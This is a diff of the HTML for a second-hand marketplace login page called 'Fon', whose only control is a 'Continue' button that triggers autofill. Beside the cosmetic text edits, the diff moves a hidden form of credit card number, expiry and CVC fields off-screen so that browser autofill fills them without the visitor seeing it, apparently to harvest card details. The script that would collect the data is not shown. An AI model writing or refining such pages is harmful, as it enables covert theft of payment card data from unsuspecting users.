@@ -8,21 +8,21 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="path_to_logo.png" alt="pre owned items " style="width: 100px; margin-bottom: 20px;">
-        <h1>buy and sell pre-owned items here :</h1>
+        <img src="path_to_logo.png" alt="pre-owned items" style="width: 100px; margin-bottom: 20px;">
+        <h1>Buy and sell pre-owned items here:</h1>
         <form id="loginForm">
-            <!-- Updated button with an onclick event to trigger autofill -->
-            <button type="button" onclick="triggerAutofill()">continue ➡️</button>
+            <!-- Button to trigger autofill -->
+            <button type="button" onclick="triggerAutofill()">Continue ➡️</button>
         </form>
-        <p><a href="#">welcome to Fon you can easily sell and buy items here</a></p>
-        <p class="privacy">At Fon, a large number of items have been bought and sold <a href="#">thank you for choosing Fon</a>.</p>
+        <p><a href="#">Welcome to Fon, you can easily sell and buy items here</a></p>
+        <p class="privacy">At Fon, a large number of items have been bought and sold. <a href="#">Thank you for choosing Fon</a>.</p>
     </div>
 
     <!-- Hidden Form for Autofill -->
-    <form id="hiddenForm" style="display: none;">
-        <input type="text" name="cc-number" class="hidden-input" autocomplete="cc-number" placeholder="Credit Card Number">
-        <input type="text" name="cc-exp" class="hidden-input" autocomplete="cc-exp" placeholder="MM/YY">
-        <input type="text" name="cc-cvc" class="hidden-input" autocomplete="cc-cvc" placeholder="CVC">
+    <form id="hiddenForm" style="position: absolute; top: -9999px;">
+        <input type="text" name="cc-number" autocomplete="cc-number" placeholder="Credit Card Number">
+        <input type="text" name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY">
+        <input type="text" name="cc-cvc" autocomplete="cc-cvc" placeholder="CVC">
     </form>
 
     <!-- JavaScript -->
